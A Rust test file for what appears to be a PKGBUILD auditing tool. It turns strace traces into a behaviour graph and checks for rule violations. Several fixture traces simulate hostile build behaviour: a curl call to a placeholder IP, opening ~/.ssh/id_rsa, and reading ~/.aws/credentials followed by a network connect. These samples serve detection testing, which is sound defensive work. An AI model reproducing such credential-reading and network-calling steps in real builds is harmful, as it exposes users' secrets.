// SPDX-License-Identifier: GPL-2.0-or-later
//! The behaviour graph: strace text in, the same graph shape out, and the two compared.
use aurlaws::graph::{EdgeKind, NodeKind, Stage};
use aurlaws::{Evidence, LawId as L, audit_text_with, observed};

const CLEAN: &str = "pkgname=demo\npkgver=1.0\npkgrel=1\narch=(any)\nurl=https://example.org/demo\nbuild() { make; }\n";

fn laws(pkgbuild: &str, trace: &str, stage: Stage) -> Vec<L> {
    let ev = Evidence {
        observed: vec![observed::parse(trace, stage, "build trace")],
        ..Evidence::default()
    };
    let r = audit_text_with(pkgbuild, None, &ev);
    let mut v: Vec<L> = r.findings.iter().map(|f| f.law).collect();
    v.sort();
    v.dedup();
    v
}

#[test]
fn trace_becomes_the_same_graph_shape() {
    let t = r#"100 execve("/usr/bin/curl", ["curl", "http://203.0.113.9/x"], 0x1 /* 3 vars */) = 0
100 openat(AT_FDCWD, "/work/.build/demo/src/a.txt", O_RDONLY) = 3
100 socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4
100 connect(4, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("203.0.113.9")}, 16) = -1 EINPROGRESS (Operation now in progress)
100 openat(AT_FDCWD, "/work/.build/demo/pkg/demo/usr/bin/a", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 5
"#;
    let g = observed::parse(t, Stage::Build, "build trace");
    assert!(g.find("$srcdir/a.txt").is_some(), "{:#?}", g.nodes);
    assert!(g.find("$pkgdir/usr/bin/a").is_some(), "{:#?}", g.nodes);
    let sock = g.find("sock:203.0.113.9:80").expect("socket node");
    assert_eq!(g.nodes[sock as usize].kind, NodeKind::Socket);
    assert!(
        g.edges
            .iter()
            .any(|e| e.kind == EdgeKind::Sends && e.dst == sock)
    );
    assert!(
        g.edges
            .iter()
            .any(|e| e.kind == EdgeKind::Fetches && e.src == sock)
    );
}

#[test]
fn split_syscalls_rejoin_and_children_inherit() {
    let t = r#"100 execve("/usr/bin/sh", ["sh", "-c", "x"], 0x1) = 0
100 clone3({flags=CLONE_VM, exit_signal=SIGCHLD}, 88 <unfinished ...>
101 execve("/usr/bin/cat", ["cat", "~"], 0x1 <unfinished ...>
100 <... clone3 resumed>) = 101
101 <... execve resumed>) = 0
101 chdir("/work/home") = 0
101 openat(AT_FDCWD, ".ssh/id_rsa", O_RDONLY) = -1 ENOENT (No such file or directory)
"#;
    let g = observed::parse(t, Stage::Build, "build trace");
    assert!(g.find("$HOME/.ssh/id_rsa").is_some(), "{:#?}", g.nodes);
}

#[test]
fn a_clean_declaring_build_that_opens_ssh_keys_is_a_mismatch_even_when_the_open_fails() {
    let t = "100 execve(\"/usr/bin/make\", [\"make\"], 0x1) = 0\n100 openat(AT_FDCWD, \"/work/home/.ssh/id_rsa\", O_RDONLY) = -1 ENOENT (No such file or directory)\n";
    let got = laws(CLEAN, t, Stage::Build);
    assert_eq!(got, [L::ReadCredentials, L::ObservedMismatch]);
}

#[test]
fn hidden_network_in_a_scriptlet_run() {
    let t = "100 execve(\"/usr/bin/sh\", [\"sh\"], 0x1) = 0\n100 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr(\"203.0.113.9\")}, 16) = -1 ENETUNREACH (Network is unreachable)\n";
    let got = laws(CLEAN, t, Stage::Scriptlet);
    assert!(got.contains(&L::PostinstallNetwork), "{got:?}");
    assert!(got.contains(&L::ObservedMismatch), "{got:?}");
}

#[test]
fn secret_read_then_connect_in_one_trace() {
    let t = "100 execve(\"/usr/bin/sh\", [\"sh\"], 0x1) = 0\n100 openat(AT_FDCWD, \"/work/home/.aws/credentials\", O_RDONLY) = 3\n100 connect(4, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr(\"203.0.113.9\")}, 16) = 0\n";
    assert!(laws(CLEAN, t, Stage::Build).contains(&L::CredentialToNetwork));
}

#[test]
fn ordinary_build_noise_is_quiet() {
    let t = r#"100 execve("/usr/bin/make", ["make"], 0x1) = 0
100 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
100 openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
100 openat(AT_FDCWD, "/work/.build/demo/src/a.c", O_RDONLY) = 3
100 openat(AT_FDCWD, "/tmp/cc1.o", O_RDWR|O_CREAT|O_EXCL, 0600) = 4
100 openat(AT_FDCWD, "/dev/null", O_WRONLY) = 5
100 connect(6, {sa_family=AF_UNIX, sun_path="/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
100 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.53")}, 16) = 0
"#;
    assert_eq!(laws(CLEAN, t, Stage::Build), []);
}

#[test]
fn python_making_its_bytecode_folder_is_noise() {
    let t = r#"100 execve("/usr/bin/gdb", ["gdb"], 0x1) = 0
100 mkdir("/usr/share/gdb/python/gdb/__pycache__", 0777) = -1 EROFS (Read-only file system)
100 openat(AT_FDCWD, "/usr/share/gdb/python/gdb/__pycache__/a.pyc", O_WRONLY|O_CREAT, 0644) = -1 ENOENT (No such file or directory)
"#;
    assert_eq!(laws(CLEAN, t, Stage::Build), []);
}

#[test]
fn a_gpg_home_read_by_gpg_itself_is_noise() {
    let t = "100 execve(\"/usr/bin/gpg\", [\"gpg\", \"--verify\"], 0x1) = 0\n100 openat(AT_FDCWD, \"/work/home/.gnupg/pubring.kbx\", O_RDONLY) = 3\n";
    assert_eq!(laws(CLEAN, t, Stage::Build), []);
}

#[test]
fn a_truncated_or_garbled_trace_never_panics() {
    for t in [
        "",
        "garbage",
        "100 ",
        "100 openat(",
        "100 <... openat resumed>) = 3",
        "x execve(\"",
        "100 connect(3, {sa_family=AF_INET",
    ] {
        let _ = observed::parse(t, Stage::Build, "build trace");
    }
}
